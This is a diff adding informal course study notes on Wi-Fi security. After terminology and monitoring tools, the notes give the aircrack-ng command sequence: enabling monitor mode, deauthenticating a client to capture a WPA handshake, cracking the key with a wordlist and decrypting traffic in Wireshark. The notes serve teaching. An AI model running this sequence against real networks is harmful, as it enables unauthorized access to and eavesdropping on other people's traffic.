@@ -1,0 +1,77 @@
+You will not be able to do all the stuff on the exam
+
+You will probably be given a wireshark caption and need to interpret it for example.
+
+= Intro =
+
+What you want? You want wireless shit, with access points that are going to the switch
+
+You have a bunch of versions of Wi-Fi, so you just can have different bandwidths and possible frequencies it works with
+
+Access points can also have antennas, and then you will have a different way that actually direct shit
+
+Terminologies! :
+* SSID (max 32 bytes)- name of wi-fi network
+* BSSID - the MAC address of an access point that has set up an SSID
+* AP (access point) - used to access the internet wireless
+
+You can make different types of mapping that are related to showing different wi-fi bullshit on the internet or anywhere. You can just walk around and find out.
+
+You want to also monitor the network! There are multiple tools for that
+
+Such are:
+* inSSIDer
+* Kismet
+* Wireshark
+
+Etc
+
+= Basic Wi-Fi operation =
+
+You can have authentication over the network. That will work like some kind of UDP as it needs some handshakes and etc.
+
+= Connecting an adapter =
+
+When you connect the adapter, connect it to the VM
+
+Then check the interfaces with *ip link* and see there for example *wlan0*
+
+Check that with *iwconfig* as well
+
+Now you want to kill other services and have it in monitor mode
+
+systemctl stop networkmanager (or sudo airmon-ng check kill)
+
+systemctl stop wpa_supplicant
+
+ifconfig wlan0 down
+
+ifconfig wlan0 mode monitor
+
+or you can make your life easier and do:
+* sudo airmon-ng check
+* sudo airmon-ng check kill
+* sudo airmon-ng start wlan0
+* sudo airodump-ng wlan0mon
+
+You can limit the monitor to less shit:
+* sudo airodump-ng wlan0mon -c 11 --bssid <BSSID>
+
+airodump captures data that is being sent
+
+sudo airodump-ng -c 1 --bssid <BSSID> -w output wlan0mon - you are doing an output
+
+You are waiting for a handshake to start again, but before that, you need somebody to disconnect from the network
+
+You can force that with:
+* sudo aireplay-ng --deauth 1 -a <BSSID> -c <BSSID CLIENT> wlan0mon
+
+Then it will tell you that it got a new handshake, in the airodump that is running in parallell
+
+We are interested in .cap files that we got as output.
+
+sudo aircrack-ng -w /usr/share/wordlists/nmap.lst output-01.cap
+
+This will be used to understand what is the key for the networkk.
+
+After that, you can of course go to wireshark, and use that key to decrypt what is going on the network
